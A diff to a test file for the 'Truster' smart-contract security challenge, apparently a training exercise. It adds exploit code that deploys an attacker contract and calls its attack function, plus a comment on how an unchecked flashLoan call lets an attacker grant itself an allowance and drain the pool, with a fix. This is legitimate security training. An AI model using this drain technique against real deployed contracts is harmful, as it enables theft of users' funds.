@@ -29,6 +29,27 @@ describe('[Challenge] Truster', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE  */
+        const trusterAttackerContractFactory = await ethers.getContractFactory(
+            'TrusterAttacker', deployer
+        );
+        this.trusterAttacker = await trusterAttackerContractFactory
+            .connect(attacker)
+            .deploy(
+                this.pool.address, 
+                this.token.address
+            );
+
+        /*
+            Vulnerability:
+                The pool.flashLoan function calls the received target address with any received
+                data without checking the target or data first. This allows an attacker manipulate
+                the pool into granting an unlimited token allowance to themselves which the
+                attacker then uses to withdraw the pool's token balance.
+            Recommendation:
+                The pool.flashLoan function should restrict the target and/or data fields to
+                limit an attacker's ability to make such unverified calls.
+        */
+        await this.trusterAttacker.connect(attacker).attack();
     });
 
     after(async function () {
